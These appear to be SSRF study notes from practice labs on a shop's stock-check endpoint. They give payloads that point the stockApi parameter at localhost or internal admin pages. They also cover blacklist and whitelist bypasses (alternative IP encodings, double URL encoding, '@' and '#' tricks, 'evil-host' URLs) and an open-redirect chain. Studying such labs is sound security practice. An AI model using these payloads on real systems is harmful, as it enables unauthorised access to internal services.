### Localhost as the target url
> Note: The administrative interface might listen on a different port number

Let's say there's an endpoint which accepts the following req.body:
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
The result of that request is returned to the client. We can change the req.body to:
```
stockApi=http://localhost/admin
```
which may return us an html for the admin page


### SSRF with blacklist-based input filter
Ways of circumventing blacklists:
- Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
- Register your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.

#### Lab:
Let's say we're trying to SSRF into http://localhost/admin but the input is blacklisted
We can try to avade the blacklist by double url encoding "a" letter from /admin
And the req.body becomes: stockApi=http://127.1/%25%36%31dmin

### SSRF with whitelist-based input filters
The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method: 

- You can embed credentials in a URL before the hostname, using the `@` character. For example:
```
https://expected-host:fakepassword@evil-host
```

- You can use the `#` character to indicate a URL fragment. For example:
```
https://evil-host#expected-host
```

- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```
https://expected-host.evil-host
```

- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.

- You can use combinations of these techniques together.

#### Lab:
THere's a check stock endpoint with the following req.body:
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1
```
If we change it to:
```
stockApi=http://localhost OR stockApi=http://127.0.0.1
```
We get an err:
```
External stock check host must be `stock.weliketoshop.net`
```
Which indicates that there's a whitelist that contains `stock.weliketoshop.net`

We play around with it and try the following:
```
stockApi=http://random#stock.weliketoshop.net
```
which gives us back the same error:
```
"External stock check host must be stock.weliketoshop.net"
```
which means that it treats random as the url and `stock.weliketoshop.net` as an element on the website

We can try to double-url-encode `#` character and see what we get as a response
```
stockApi=http://localhost%2523stock.weliketoshop.net
```
After double-url encoding it, we get the same err:
```
"External stock check host must be stock.weliketoshop.net"
```
But if we add `@` - we can get a response from `localhost` (which in this case contains a link to `/admin`)
```
stockApi=http://localhost%2523@stock.weliketoshop.net
```

### Open redirection
Let's say the user-submitted URL is strictly validated
But let's also say there are 2 different endpoints:
```
POST /product/stock HTTP/2 
req.body = stockApi=/product/stock/check?productId=1&storeId=1
```
And the second:
```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
```

We can try to modify the req.body of the first endpoint to the following:
```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```
And it will include the contents of /admin in the POST /product/stock response
In other words server will return  302 redirection to whatever is specified in `path` param 

